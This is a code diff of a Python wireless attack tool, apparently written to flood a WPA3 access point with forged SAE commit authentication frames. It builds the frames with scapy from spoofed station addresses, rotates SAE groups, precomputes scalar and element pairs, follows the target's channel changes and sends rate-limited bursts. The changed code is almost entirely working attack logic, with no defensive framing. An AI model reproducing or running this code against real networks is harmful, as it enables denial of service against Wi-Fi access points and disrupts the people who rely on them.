@@ -429,10 +429,10 @@ def scanner_process(iface, interval, duration, shared, lock, b5, b2):
             time.sleep(interval)
             
     except KeyboardInterrupt:
-        # Fängt das Ctrl+C Signal still und heimlich ab
+
         pass
     finally:
-        # Stellt sicher, dass auch bei einem harten Abbruch aufgeräumt wird
+
         for f in glob.glob("/tmp/scan_cont_*"):
             try: os.remove(f)
             except Exception: pass
@@ -475,7 +475,18 @@ def run_attacker_process(interface, bssid, initial_channel, band, attack_type, c
 
     valid_groups = get_valid_groups(band)
     group_index = 0
-    logger.info(f"[ATTACK] {interface} | Valid Groups: {valid_groups} | Band: {band} | Initial Ch: {current_channel}")
+    logger.info(f"[ATTACK] [{interface}] Valid Groups: {valid_groups} | Band: {band} | Initial Ch: {current_channel}")
+
+    scalars = SAE_SCALARS_5GHZ if band == "5GHz" else SAE_SCALARS_2_4GHZ
+    finites = SAE_FINITES_5GHZ if band == "5GHz" else SAE_FINITES_2_4GHZ
+    known_macs = KNOWN_STA_MACS_5GHZ if band == "5GHz" else KNOWN_STA_MACS_2_4GHZ
+
+    precomputed_pairs = {}
+    for gid in valid_groups:
+        valid_s = [s for s in scalars.get(gid, []) if "INSERT" not in s]
+        valid_f = [f for f in finites.get(gid, []) if "INSERT" not in f]
+        precomputed_pairs[gid] = build_valid_pairs(valid_s, valid_f, gid)
+    # ===================================================================
 
     burst_count = 0
     own_commit_cache = {}
@@ -486,7 +497,6 @@ def run_attacker_process(interface, bssid, initial_channel, band, attack_type, c
                 logger.info(f"[STOP] {interface} received shutdown signal")
                 break
 
-            # === DYNAMISCHES KANAL-TRACKING ===
             latest_channel = shared_channels.get(band)
             if latest_channel and latest_channel != current_channel:
                 logger.info(f"[TRACKING] {interface}: AP changed channel from {current_channel} to {latest_channel}. Hopping...")
@@ -497,40 +507,36 @@ def run_attacker_process(interface, bssid, initial_channel, band, attack_type, c
             sae_group = valid_groups[group_index % len(valid_groups)]
             group_index += 1
 
-            scalars = SAE_SCALARS_5GHZ if band == "5GHz" else SAE_SCALARS_2_4GHZ
-            finites = SAE_FINITES_5GHZ if band == "5GHz" else SAE_FINITES_2_4GHZ
-            known_macs = KNOWN_STA_MACS_5GHZ if band == "5GHz" else KNOWN_STA_MACS_2_4GHZ
-
-            # Build valid pairs for current group
-            valid_pairs = build_valid_pairs(
-                scalars.get(sae_group, []),
-                finites.get(sae_group, []),
-                sae_group
-            )
+            valid_pairs = precomputed_pairs.get(sae_group, [])
 
             if valid_pairs:
                 preview_s = valid_pairs[0][0][:4].hex()
                 preview_f = valid_pairs[0][1][:4].hex()
-                logger.info(f"[PAIRS] Group {sae_group}: {len(valid_pairs)} valid pairs loaded. Sample: S={preview_s}... F={preview_f}...")
+                logger.info(f"[PAIRS] [{interface} | {band}] Group {sae_group}: {len(valid_pairs)} valid pairs loaded. Sample: S={preview_s}... F={preview_f}...")
             else:
-                logger.warning(f"[PAIRS] Group {sae_group}: No valid pairs. Falling back to random bytes.")
+                logger.warning(f"[PAIRS] [{interface} | {band}] Group {sae_group}: No valid pairs. Falling back to random bytes.")
 
             def get_sae_pair():
-                return get_sae_pair_from_list(valid_pairs)
+                if not valid_pairs:
+                    s_len, e_len = SAE_GROUP_LENGTHS[sae_group]
+                    return os.urandom(s_len), os.urandom(e_len)
+                return random.choice(valid_pairs)
 
-            def make_commit(mac, seq=1, gid=sae_group, s_bytes=None, f_bytes=None):
+            def make_commit(mac, seq=1, gid=sae_group, s_bytes=None, f_bytes=None, pw_id=None):
                 if s_bytes is None or f_bytes is None:
                     gen_s, gen_f = get_sae_pair()
-                    if s_bytes is None:
-                        s_bytes = gen_s
-                    if f_bytes is None:
-                        f_bytes = gen_f
+                    if s_bytes is None: s_bytes = gen_s
+                    if f_bytes is None: f_bytes = gen_f
                 payload = SAE_GROUP_BYTES[gid] + s_bytes + f_bytes
                 return RadioTap()/Dot11(type=0, subtype=11, addr1=bssid, addr2=mac, addr3=bssid)/Dot11Auth(algo=3, seqnum=seq, status=0)/payload
 
             def safe_send(pkt, iface, dry):
                 if not dry:
-                    sendp(pkt, iface=iface, verbose=False)
+                    try:
+                        sock = conf.L2socket(iface=iface)
+                        sock.send(pkt)
+                        sock.close()
+                    except Exception: pass
 
             packets = []
             t0 = time.time()
@@ -603,7 +609,7 @@ def run_attacker_process(interface, bssid, initial_channel, band, attack_type, c
                 if burst_count % LOG_EVERY_N_BURSTS == 0:
                     logger.info(f"[BURST] Interface: {interface} | Band: {band} | Channel: {current_channel} | Attack: {attack_type.upper()} | Active Group: {sae_group} | Pairs: {len(valid_pairs)} | Burst: #{burst_count} | Duration: {dt:.3f}s")
 
-                time.sleep(max(0.01, 1.0 / (PACKETS_PER_SECOND_LIMIT / BURST_SIZE)))
+            time.sleep(max(0.01, 1.0 / (PACKETS_PER_SECOND_LIMIT / BURST_SIZE)))
 
     except KeyboardInterrupt:
         logger.info(f"[STOP] Interface: {interface} interrupted")
@@ -793,7 +799,6 @@ def main():
                     if not ch:
                         ch = MANUAL_CHANNEL_5GHZ if band == '5GHz' else MANUAL_CHANNEL_2_4GHZ
 
-                # === INTELLIGENTE WARTE-SCHLEIFE ===
                 if not ch:
                     logger.info(f"[WAIT] {iface}: Waiting for scanner to find {band} AP channel...")
                     time.sleep(3)
